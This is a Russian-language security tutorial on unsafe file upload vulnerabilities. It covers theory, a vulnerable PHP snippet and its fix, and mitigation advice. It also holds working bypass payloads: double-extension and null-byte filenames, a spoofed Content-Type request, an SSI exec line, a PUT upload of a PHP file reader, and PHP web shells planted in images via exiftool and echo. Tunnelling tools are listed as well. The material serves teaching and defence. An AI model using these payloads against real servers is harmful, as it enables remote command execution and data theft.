# **Unsafe File Upload.Небезопасная загрузка файлов.**

## **Описание уязвимости**
Unsafe File Upload(Небезопасная загрузка файлов) - это уязвимость веб-преложений позволяющая злоумышленнику загружать вредоносные файлы на веб-сервер.
Данная уязвимость позволяет злоумышленнику загружать файлы на веб-сервер и при отсутствие проверок и фильтрации загружаемой информации злоумышленник может
внедрить в файл небезопасный код.

В результате такой атаки золумышленник может:
+ Загрузить web-shell, получив удалённое выполнение команд на веб-сервере
+ Загрузить reverse-shell, получив удалённое обратное подключение на свою машину
+ Возможность перезаписи и удаления файлов
+ XSS
+ Размещение фишинговой страницы на веб-сервере
+ Расскрытие конфиденциальной информации
+ Отказ в обслуживание

## **Теория**
Узвимость небезопасной загрузки файлов возникает при наличие функционала загрузки файлов на севрер и отсутствие проверок загружаемого контента.
При наличии возможно загрузки файлов на веб-сервер, злоумышленник может добавить вредоносный код в файл и отправить его на веб-сервер, получив в ответ ссылку на файл, в зависимости от того, как сервер её обработает.
Подробнее с Unsafe File Upload можно ознакомиться здесь:
'''
https://book.hacktricks.xyz/pentesting-web/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
'''
Рассмотрим пример уязвимого кода на php, в котором не производится проверка роли пользователя от которого загружается файл:
'''
      <?php
        $target_dir = "uploads/";
        $target_file = $target_dir.basename($_FILES["fileToUpload"]["name"]);
        $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
'''
Для исправления данной уязвимости следует добавить код, проверяющий роль пользователя перед загрузкой файла:
'''
        if (!current_user_can('upload_files'))  //проверка прав пользователя на загрузку файлов
        die(__('You do not have permission to upload files.')); 
'''


###Обход фильтрации загружаемого контента
+Загрузка файлов с именем, которое уже имеется на сервере.(можно получить сообщение об ошибке(может привести к перезаписи чувствительных файлов))
+Загрузка фалов, когда папка с таким названием уже существует.
+Загрузка файлов с длинным названием
+Загрузка одно файла несколько раз, в один промежуток времени.
+Использование двойных расширений или малоизвестных расширений
Обходится с помощью использования двойных расширений ('shell.php.png') или малоизвестный расширений ('.php5', '.phtml', '.shtml', '.htaccess'). Кроме того, возможна инъекция нулевого байта ('shell.php%00.jpg') или регистрозависимость при проверке ('.PHp3', '.aSp').
+Санитайзеры
Оставляет большую степень свободы. Например, если санитайзер удаляет вхождения подстрок типа '.php', то использования имени файла вида 'shell.p.phphp' позволяет после загрузки получить файл с именем 'shell.php'. 
+Валидация Content-Type
'''
POST / HTTP/1.1
Host: vuln.ru
Content-Length: 200
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="info.php"
Content-Type: text/php
 <?php phpinfo(); ?>
------WebKitFormBoundary--
'''
строчка 'Content-Type: text/php' может быть заменена на строчку 'Content-Type: image/png'. 
+'Server Side Includes' - язык для динамической «сборки» веб-страниц на сервере из отдельных составных частей и выдачи клиенту полученного HTML-документа. Имеет расширения .shtml, .stm или .shtm. Например, при загрузке и вызове file.shtml, содержащего код 
'''<!-- #exec cmd="ls" -->'''
атакующему будет выведен список файлов данной директории. 
+Загрузка файлов используя метод 'PUT'
Если метод 'PUT' настроен не корректно, можно использовать его для загрузки файлов на сервер:
'''
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
'''
+Добавление в начало файла байты реального изображения:
'''
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
'''
или добавить полезную нагрузку в изображение:
'''
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
'''
###Способы проброса шелла
| Утилита  |     Способ         | Ссылка|
| ---------|:------------------:| -----:|
| ssh      | Более подробно по ссылке   | [SSH](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#ssh) |
| sshutlle | sshuttle -vr username@ip 0/0 --ssh-cmd 'ssh' |   [sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) |
| reGeorg  | Можно загрузить файл на веб-сервер с тунелем и установить соединение через него(если нет возможности открыть порт на машине)|    [reGeorg](https://github.com/sensepost/reGeorg) |
| chisel   | Установка соединения через сервер и клиент. Ссылки на инструкцию и релиз на гитхабе(чтоб не устанавливать на машину) | [Интсрукция](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#chisel) [Release](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#chisel)       |
[Дополнительная информация по тунелям и пробросу портов](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
[Reverse Shell Generator](https://www.revshells.com/)

###Рекомендации
+Проверка расширений загружаемых файлов
+Проверка содержимого загружаемых файлов
+Создания списка допустимых расширений, допустимых  к загрузке
+Генерировать имя файла и расширение при записи на сервер
+Запрет на выполнение файлов в дерикториях доступных пользователю
+Сравнивать последовательность байтов файла(magic bytes) с ожидаемым расширением файла, например файлы 'JPEG' всегда содержат в начале 'FF D8 FF'

### **Проверка расширений загружаемых файлов и проверка содержимого загружаемых файлов**
Проверять название и рисширение загружаемого файла на наличие спец. символов, дополнительных расширний в файле и тд.
### **Создания списка допустимых расширений, допустимых  к загрузке**
Создание "BlackList" и "WhiteList" расширений для загрузки файлов
BlackList - список расширений недоступных для загрузки
WhiteList - список расширений, файлы с которыми допущены для загрузки
### **Генерировать имя файла и расширение при записи на сервер**
Лучше всего генерировать случайное имя, которое невозможно угадать, например использовать UUID в качестве имени файла.
### **Запрет на выполнение файлов в дерикториях доступных пользователю**
Загружать файлы на веб сервер за пределы веб-каталога, это гарантирует, что веб файлы не будут доступны напрямую, через веб-сервер.
### **Сравнивать последовательность байтов файла с ожидаемым расширением файла**
Производить сравнение получаемого расширения файла с его стандартными байтами, которы епринадлежать данному расширению.
https://www.netspi.com/blog/technical/web-application-penetration-testing/magic-bytes-identifying-common-file-formats-at-a-glance/
###Общая рекомендация
Убедитесь, что пользователь не имеет контроля над именем файла и расширением. Лучше всего генерировать случайное имя, которое невозможно угадать, например, используя UUID в качестве имени файла. Это предотвращает перезапись существующих файлов, загрузку веб-оболочек, прямые ссылки на файлы и уязвимости обхода пути.
Рекомендуется хранить загруженные файлы за пределами корневого веб-каталога, в идеале на отдельном разделе или в общей папке. Это гарантирует, что загруженные файлы не могут быть напрямую доступны через веб-сервер, это предотвращает загрузку исполняемых скриптов (т.е. веб-шеллов), и злоумышленники не могут вызвать состояние отказа в обслуживании веб-сервера, заполнив его системный диск. Кроме того, загруженные файлы не должны иметь разрешения на выполнение (т.е. устанавливаться на уровне файловой системы или включать директивы веб-сервера).
Ограничения ресурсов должны быть настроены для всего раздела хранилища, а также максимальный размер файла и общий размер загрузки одним пользователем.
Если существуют ограничения по типам файлов, проверьте файловую сигнатуру, а не полагайтесь на расширение или MIME-тип. Все проверки должны выполняться на стороне сервера, так как меры на стороне клиента можно легко обойти. В зависимости от формата файла должны выполняться дополнительные проверки достоверности (например, формата файла).
